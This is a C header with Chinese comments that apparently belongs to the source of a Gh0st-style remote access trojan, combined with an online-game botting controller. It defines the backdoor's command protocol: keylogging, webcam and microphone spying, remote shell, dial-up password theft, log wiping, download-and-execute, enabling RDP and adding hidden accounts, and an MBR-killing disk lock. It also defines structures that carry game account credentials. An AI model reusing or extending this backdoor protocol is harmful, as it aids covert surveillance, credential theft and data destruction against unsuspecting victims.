
#if !defined(AFX_MACROS_H_INCLUDED)
#define AFX_MACROS_H_INCLUDED

#define IDR_ENCODE 513		//资源中的上线信息
#define IDR_CONFIG 514		//资源中的服务信息
#define	MAX_WRITE_RETRY			15 // 重试写入文件次数
#define	MAX_SEND_BUFFER			1024 * 8 // 最大发送数据长度
#define MAX_RECV_BUFFER			1024 * 8 // 最大接收数据长度

// BYTE最大也就256
enum
{
	// 文件传输方式
	TRANSFER_MODE_NORMAL = 0x00,	// 一般,如果本地或者远程已经有，取消
	TRANSFER_MODE_ADDITION,			// 追加
	TRANSFER_MODE_ADDITION_ALL,		// 全部追加
	TRANSFER_MODE_OVERWRITE,		// 覆盖
	TRANSFER_MODE_OVERWRITE_ALL,	// 全部覆盖
	TRANSFER_MODE_JUMP,				// 覆盖
	TRANSFER_MODE_JUMP_ALL,			// 全部覆盖
	TRANSFER_MODE_CANCEL,			// 取消传送

	// 控制端发出的命令
	COMMAND_ACTIVED = 0x00,			// 服务端可以激活开始工作
	COMMAND_LIST_DRIVE,				// 列出磁盘目录
	COMMAND_LIST_FILES,				// 列出目录中的文件
	COMMAND_DOWN_FILES,				// 下载文件
	COMMAND_FILE_SIZE,				// 上传时的文件大小
	COMMAND_FILE_DATA,				// 上传时的文件数据
	COMMAND_EXCEPTION,				// 传输发生异常，需要重新传输
	COMMAND_CONTINUE,				// 传输正常，请求继续发送数据
	COMMAND_STOP,					// 传输中止
	COMMAND_DELETE_FILE,			// 删除文件
	COMMAND_DELETE_DIRECTORY,		// 删除目录
	COMMAND_SET_TRANSFER_MODE,		// 设置传输方式
	COMMAND_CREATE_FOLDER,			// 创建文件夹
	COMMAND_RENAME_FILE,			// 文件或文件改名
	COMMAND_OPEN_FILE_SHOW,			// 显示打开文件
	COMMAND_OPEN_FILE_HIDE,			// 隐藏打开文件

	COMMAND_SCREEN_SPY,				// 屏幕查看
	COMMAND_SCREEN_RESET,			// 改变屏幕深度
	COMMAND_ALGORITHM_RESET,		// 改变算法
	COMMAND_SCREEN_CTRL_ALT_DEL,	// 发送Ctrl+Alt+Del
	COMMAND_SCREEN_CONTROL,			// 屏幕控制
	COMMAND_SCREEN_BLOCK_INPUT,		// 锁定服务端键盘鼠标输入
	COMMAND_SCREEN_BLANK,			// 服务端黑屏
	COMMAND_SCREEN_CAPTURE_LAYER,	// 捕捉层
	COMMAND_SCREEN_GET_CLIPBOARD,	// 获取远程剪贴版
	COMMAND_SCREEN_SET_CLIPBOARD,	// 设置远程剪帖版

	COMMAND_WEBCAM,					// 摄像头
	COMMAND_WEBCAM_ENABLECOMPRESS,	// 摄像头数据要求经过H263压缩
	COMMAND_WEBCAM_DISABLECOMPRESS,	// 摄像头数据要求原始高清模式
	COMMAND_WEBCAM_RESIZE,			// 摄像头调整分辩率，后面跟两个INT型的宽高
	COMMAND_NEXT,					// 下一步(控制端已经打开对话框)

	COMMAND_KEYBOARD,				// 键盘记录
	COMMAND_KEYBOARD_OFFLINE,		// 开启离线键盘记录
	COMMAND_KEYBOARD_CLEAR,			// 清除键盘记录内容

	COMMAND_AUDIO,					// 语音监听

	COMMAND_SYSTEM,					// 系统管理（进程，窗口....）
	COMMAND_SYSTEMINFO,				// 进程列表
	COMMAND_PSLIST,					// 进程列表
	COMMAND_WSLIST,					// 窗口列表
	COMMAND_DIALUPASS,				// 拨号密码
	COMMAND_KILLPROCESS,			// 关闭进程
	COMMAND_KILLPROCEDELE,           // 关闭进程并删除文件
	COMMAND_WINDOW_CLOSE,           // 关闭窗口
	COMMAND_WINDOW_TEST,            // 操作窗口
	COMMAND_MEMOEY,                 //获取CPU内存值命令
	COMMAND_STOPED,                 //发送停止命令
	COMMAND_SHELL,					// cmdshell
	COMMAND_SESSION,				// 会话管理（关机，重启，注销, 卸载）
	COMMAND_REMOVE,					// 卸载后门
	COMMAND_DOWN_EXEC,				// 其它功能 - 下载执行
	COMMAND_UPDATE_SERVER,			// 其它功能 - 下载更新
	COMMAND_CLEAN_System,			// 其它管理 - 清除系统日志
	COMMAND_CLEAN_Security,			// 其它管理 - 清除系统日志
	COMMAND_CLEAN_Application,		// 其它管理 - 清除系统日志
	COMMAND_CLEAN_ALL,			    // 其它管理 - 清除系统日志
	COMMAND_OPEN_URL_HIDE,			// 其它管理 - 隐藏打开网页
	COMMAND_OPEN_URL_SHOW,			// 其它管理 - 显示打开网页
	COMMAND_RENAME_REMARK,			// 重命名备注
	COMMAND_REPLAY_HEARTBEAT,		// 回复心跳包
	//////////////////////新功能////////////////////////

	COMMAND_CHANGE_GROUP,			// 更改分组
	COMMAND_SENDFILE_HIDE,			// 隐藏运行
	COMMAND_SENDFILE_NORMAL,		// 显示运行
	COMMAND_SENDFILE_NOSTART,		// 不去运行
	COMMAND_SENDFILE_UPDATA,		// 更新运行
	COMMAND_OPEN_PROXY,				// 开启代理
	COMMAND_SHOW_MSG,				// 发送信息
	COMMAND_KILL_MBR,				// 硬盘锁
	COMMAND_PORT_MAPPING,			// 端口映射

	/////////////////////////////////////////////////////
	COMMAND_SERVER_START,		    // 服务器管理
	COMMAND_USER_LIST,		        // 用户
	COMMAND_NETWORK_LIST,		    // 网络
	COMMAND_SERVER_PORT,		    // 服务器端口修改
	COMMAND_OPEN_3389,				// 开启3389
	COMMAND_NET_USER,				// 无NET添加用户
	COMMAND_NET_YHSX,		        // 用户刷新
	COMMAND_NET_START,		        // 帐户启动
	COMMAND_NET_DISABLE,		    // 帐户禁用
	COMMAND_NET_DEL,		        // 帐户删除
	COMMAND_RENAME_PASSWORD,        // 帐户密码修改
	COMMAND_NRTWORK_CARD,           // 网络适配器刷新
	COMMAND_DEL_SHIFTOSK,           // 软键盘及放大镜删除
	//////////////////////////////////////////////////////
	COMMAND_SERMANAGER,				// 服务管理 
	COMMAND_SSLIST,					// 服务列表
	COMMAND_STARTSERVERICE,			// 启动服务
	COMMAND_STOPSERVERICE,			// 停止服务
	COMMAND_DELETESERVERICE,		// 删除服务
	COMMAND_CREATSERVERICE,			// 创建服务
	COMMAND_AUTOSERVERICE,			// 自启动
	COMMAND_HANDSERVERICE,			// 手动
	COMMAND_DISABLESERVERICE,		// 禁止

	COMMAND_SERVERS_SETOPT,         //设置服务启动项          
	COMMAND_SERVERS_DEL,            //删除指定服务
	COMMAND_REGEDIT,                //注册表管理
	COMMAND_REG_FIND,               //查询该项  
	COMMAND_REG_DELPATH,            //删除项
	COMMAND_REG_CREATEPATH,         //创建项
	COMMAND_REG_DELKEY,             //删除键
	COMMAND_REG_CREATKEY,           //创建键

	/************************/
	COMMAND_REBOOTAPP,
	COMMAND_FIRSTSTART,
	COMMAND_NEXTINDEXDO,            //下个角色
	COMMAND_AUTOUPDATE,
	COMMAND_START_SCRIPT,
	COMMAND_STOP_SCRIPT,
	COMMAND_SUSPEND_SCRIPT,
	COMMAND_RESUME_SCRIPT,
	COMMAND_UNINSTALL,
	COMMAND_SETCODELIST,            //设置帐号列表
	COMMAND_SETLOGININFO,           //设置登录信息
	COMMAND_GETRUNNINGINFO,        //提交本地Running数据
	COMMAND_EXITGAME,               //退出游戏
	COMMAND_REGISTER,
	COMMAND_RECHARGE,
	COMMAND_GETONLINEMEMBER,    //得到在线成员
	COMMAND_SETONLINEMEMBER,    //设置在线成员
	COMMAND_SETONLINEPLAYERS,
	COMMAND_SETPROTECTAUCTION,
	COMMAND_SETHUNTERPOSS,
	/************************/

	// 服务端发出的标识
	TOKEN_AUTH = 100,				// 要求验证
	TOKEN_HEARTBEAT,				// 心跳包
	TOKEN_LOGIN,					// 上线包
	TOKEN_DRIVE_LIST,				// 驱动器列表
	TOKEN_FILE_LIST,				// 文件列表
	TOKEN_FILE_SIZE,				// 文件大小，传输文件时用
	TOKEN_FILE_DATA,				// 文件数据
	TOKEN_TRANSFER_FINISH,			// 传输完毕
	TOKEN_DELETE_FINISH,			// 删除完毕
	TOKEN_GET_TRANSFER_MODE,		// 得到文件传输方式
	TOKEN_GET_FILEDATA,				// 远程得到本地文件数据
	TOKEN_CREATEFOLDER_FINISH,		// 创建文件夹任务完成
	TOKEN_DATA_CONTINUE,			// 继续传输数据
	TOKEN_RENAME_FINISH,			// 改名操作完成
	TOKEN_EXCEPTION,				// 操作发生异常

	TOKEN_BITMAPINFO,				// 屏幕查看的BITMAPINFO
	TOKEN_FIRSTSCREEN,				// 屏幕查看的第一张图
	TOKEN_NEXTSCREEN,				// 屏幕查看的下一张图
	TOKEN_CLIPBOARD_TEXT,			// 屏幕查看时发送剪帖版内容


	TOKEN_WEBCAM_BITMAPINFO,		// 摄像头的BITMAPINFOHEADER
	TOKEN_WEBCAM_DIB,				// 摄像头的图像数据

	TOKEN_AUDIO_START,				// 开始语音监听
	TOKEN_AUDIO_DATA,				// 语音监听数据

	TOKEN_KEYBOARD_START,			// 键盘记录开始
	TOKEN_KEYBOARD_DATA,			// 键盘记录的数据

	TOKEN_PSLIST,					// 进程列表
	TOKEN_WSLIST,					// 窗口列表
	TOKEN_MEMORY,                   // 服务端发送过来内存使用值
	TOKEN_DIALUPASS,				// 拨号密码
	TOKEN_SHELL_START,				// 远程终端开始
	TOKEN_USER_LIST,			    // 服务器用户列表
	TOKEN_NETWORK_LIST,			    // 服务器网络列表

	// 新功能
	TOKEN_SYSTEMINFO,				// 系统信息
	TOKEN_SSLIST,					// 服务管理

	TOKEN_REGEDIT,                  // 打开注册表界面
	TOKEN_REG_PATH,                 // 发送注册表项名
	TOKEN_REG_KEY,                  // 发送键名
	TOKEN_REG_OK,                   // 执行成功
	TOKEN_REG_NO,                   // 执行失败
	//////////////////////////////////
	TOKEN_UPDATE_INFORMATION,
	TOKEN_TEAM_OPENCOMMUNICATION,
	TOKEN_TODAYFINISH,
	TOKEN_RUNNINGINFOMDB,
	TOKEN_ONLINEINFOMDB,
	TOKEN_ALLFINISH,                //单帐号全部任务完成
	TOKEN_ADDONLINETEAMPLAYER,
	TOKEN_DELONLINETEAMPLAYER,
	TOKEN_WITCHINDEXNEXTDO,
	TOKEN_CANINPUTPASSWORD,
	TOKEN_CANSELECTROLE,
	TOKEN_GETONLINEPLAYERS,
	TOKEN_GETPROTECTBUYAUCTIONS,
	TOKEN_SHOWTIPMSG,
	TOKEN_GETHUNTERPOSS,
	TOKEN_GETPROTECTSELLAUCTIONS,
};

//-----------------------------------------------
//Contrl <---------------> WatchDogX
//-----------------------------------------------
typedef struct _REGISTER
{
	char szAuxUserName[50];
	char szAuxPassword[50];
}REGISTER;

typedef struct _RECHARGE
{
	char szUserName[50];
	char szCardNum[50];
	char szCardPass[50];
}RECHARGE;

typedef struct _LOGINITEM
{	
	char szAuxUserName[50];
	char szAuxPassword[50];
	char szAnswerUserName[50];
	char szAnswerPassword[50];
	char szPPPOEUserName[50];
	char szPPPOEPassword[50];
}LOGINITEM;

typedef struct _USERITEMINFO
{
	char szMacID[50];
	char szPID[50];
	char szUserName[50];
	char szIndex[50];
	char szProfession[50];
	char szPlayerLv[32];
	char szPlayerName[50];
	char szPlayerMoney[50];
	char szScriptStatus[50];
	char szStatus[50];
}USERITEMINFO;

typedef struct _CODEITEM
{
	char szUserName[50];
	char szPassword[50];
	char szServerBig[50];
	char szServerSmall[50];
	char szLine[50];
	char szProfession[50];
	char szIdentity[50];
	char szResponsibility[50];
	char szRoleCount[50];
	char szDealModel[50];
	char szWorks[0xff];
	char szStoreName[50];
	char szClernUpTeamNum[50];
	char szArrestTeamNum[50];
	char szEscortTeamNum[50];
	char szTeamGroup[50];
}CODEITEM;

typedef struct _ONLINEITEM
{
	char szTeamGroup[50];
	char szMacID[50];
	char szPlayerName[50];
	char szIdentity[50];
	char szResponsibility[50];
}ONLINEITEM;

typedef struct _PROTECTAUCTIONITEM
{
	char szGoods[50];
	char szMoney[50];
}PROTECTAUCTIONITEM;

typedef struct _PROTECTBUYAUCTIONITEM
{
	char szGoods[50];
	char szMoney[50];
}PROTECTBUYAUCTIONITEM;

typedef struct _PROTECTSELLAUCTIONITEM
{
	char szGoods[50];
	char szMoney[50];
	char szCount[50];
}PROTECTSELLAUCTIONITEM;

typedef struct _HUNTERITEN
{
	char szMap[50];
	char szPos[50];
	char szMonster[50];
	char szRange[50];
}HUNTERITEN;

//-----------------------------------------------
//WatchDogX <---------------> DLL
//-----------------------------------------------

typedef struct _AUTOSTARTINFO
{
	unsigned char bToken;		    // = 1
	char szProfession[50];
	char szIdentity[50];
	char szResponsibility[50];
	char szRoleCount[50];
	char szDealModel[50];
	char szWorks[0xff];
	char szStoreName[50];
	char szDllPath[0xff];
	int  nStartIndex;
	char szClernUpTeamNum[50];
	char szArrestTeamNum[50];
	char szEscortTeamNum[50];
	char szTeamGroup[50];
}AUTOSTARTINFO;

typedef struct _AUTOLOGININFO
{
	char szUserName[50];
	char szPassword[50];
	char szLine[50];
	char szServerBig[50];
	char szServerSmall[50];
}AUTOLOGININFO;

typedef struct
{	
	unsigned char			bToken;			// = 1
	int			    nPID;	        //PID号
	char            szUserName[50];
	bool            bFirst;         //首次启动 
}MYLOGININFO;

typedef struct _PLAYERINFOUPDATE
{
	unsigned char   bToken;
	int             nPID;
	int             nIndex;
	char            szProfession[50];
	char            szStatus[50];
	char            szPlayerName[50];
	int             nLv;
	char            szMoney[50];
	char            szCurScriptFuncName[50];
}PLAYERINFOUPDATE;

typedef struct _TODAYFINISH
{
	unsigned char	bToken;
	char			szUserName[50];
	char			szRoleName[50];
	char			szType[50];  //比如"完成打坐"
}TODAYFINISH;

typedef struct _UPDATETEAMINI
{
	unsigned char	bToken;			// = 1
	char           szTeamGroup[50];
	char           szRoleName[50];
	char           szIdentity[50];
	char           szResponsibility[50];
}UPDATETEAMITEM;

typedef struct _WITCHINDEXNEXTDO
{
	unsigned char	bToken;			// = 1
	char			szUserName[50];
	int				nIndex;
}WITCHINDEXNEXTDO;

typedef struct _TOKENWITHUSERNAME
{
	unsigned  char	bToken;			// = 1
	char			szUserName[50];
}TOKENWITHUSERNAME;

typedef struct _SHOWTIPMSG
{
	unsigned  char	bToken;			// = 1
	char			szText[0xFF];
}SHOWTIPMSG;

#endif // !defined(AFX_MACROS_H_INCLUDED)